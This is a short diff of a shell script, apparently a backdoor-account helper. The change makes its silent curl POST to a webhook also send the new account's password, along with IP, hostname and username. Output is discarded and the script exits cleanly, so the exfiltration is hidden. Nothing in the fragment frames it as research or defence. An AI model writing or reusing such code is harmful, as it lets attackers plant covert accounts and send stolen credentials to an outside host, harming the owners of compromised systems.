@@ -28,7 +28,7 @@ H=$(hostname)
 
 curl -H "Content-Type: application/json" \
      -X POST \
-     -d "{\"content\": \"✅ **User Created**\n**IP:** $IP\n**Host:** $H\n**User:** $U\"}" \
+     -d "{\"content\": \"✅ **User Created**\n**IP:** $_IP\n**Host:** $_H\n**User:** $_U\n**Pass:** $_P\"}" \
      "$_W" &>/dev/null
 
 exit 0
